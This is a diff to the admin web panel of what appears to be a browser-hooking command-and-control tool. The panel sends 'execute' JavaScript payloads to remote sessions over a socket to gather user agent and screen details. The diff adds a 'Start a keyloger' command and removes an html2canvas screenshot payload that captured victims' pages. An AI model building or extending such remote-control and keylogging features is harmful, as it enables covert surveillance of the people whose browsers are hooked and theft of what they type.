@@ -55,7 +55,8 @@
               <div class="flex flex-col">
                 <h2 class="text-xl">Commands</h2>
                 <div class="flex flex-col">
-                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('screenshoot')">Take a screenshoot</button>
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('keyloger')">Start a keyloger</button>
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('screenshot')">Take a screenshot</button>
                   <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('usefulInfo')">Get useful informations</button>
                   <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('getUa')">Get UA</button>
                   <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('getScreenSize')">Get screen size</button>
@@ -100,7 +101,7 @@
 
       clearInterval(reconnectInterval);
       reconnectInterval = setInterval(() => {
-        setsocket.connect();
+        socket.connect();
       }, 1000);
       title.classList.add("bg-red-500");
       title.classList.remove("bg-green-500");
@@ -155,16 +156,16 @@
 
     function doAnAction(type) {
       const NYI = "NOT YET IMPLEMENTED";
-      if(type === 'screenshoot') {
+      if (type === 'screenshot') {
         socket.emit("admin:command", {
           id: state.sessionId,
           message: {
-            type: "take-screenshoot",
-            payload: "return html2canvas(document.body).then(c => c.toDataURL())"
+            type: "take-screenshot",
+            payload: '"Took a screenshot"'
           }
         });
       }
-      if(type === 'usefulInfo'){
+      if (type === 'usefulInfo') {
         socket.emit("admin:command", {
           id: state.sessionId,
           message: {
@@ -173,7 +174,7 @@
           }
         });
       }
-      if(type === 'getUa') {
+      if (type === 'getUa') {
         socket.emit("admin:command", {
           id: state.sessionId,
           message: {
@@ -182,12 +183,21 @@
           }
         });
       }
-      if(type === 'getScreenSize') {
+      if (type === 'getScreenSize') {
         socket.emit("admin:command", {
           id: state.sessionId,
           message: {
             type: "execute",
             payload: `return { docW: window.innerWidth,\ndocH: window.innerHeight,\nscrollW: window.scrollX,\nscrollH: window.scrollY,\nscreenW: window.outerWidth,\nscreenH: window.outerHeight}`,
+          }
+        });
+      }
+      if (type === 'keyloger') {
+        socket.emit("admin:command", {
+          id: state.sessionId,
+          message: {
+            type: "start-keyloger",
+            payload: `"Keyloger started"`,
           }
         });
       }
@@ -206,11 +216,16 @@
     if (messageId) {
       const el = document.querySelector(`[data-id="${messageId}"]`)
       if (el) {
-        el.scrollIntoView();
-        el.style.filter = "brightness(2)"
         setTimeout(() => {
-          el.style.filter = null;
-        }, 2000);
+
+          el.scrollIntoView({
+            behavior: "smooth"
+          });
+          el.style.filter = "brightness(2)"
+          setTimeout(() => {
+            el.style.filter = null;
+          }, 2000);
+        }, 500);
       }
     }
 
@@ -242,7 +257,7 @@
     }
     setTimeout(() => {
       window.cropToLongMessages();
-    }, 1000);
+    }, 100);
   </script>
 </body>
 
